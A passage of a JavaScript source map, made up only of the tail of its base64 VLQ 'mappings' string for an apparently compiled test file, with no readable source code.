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"}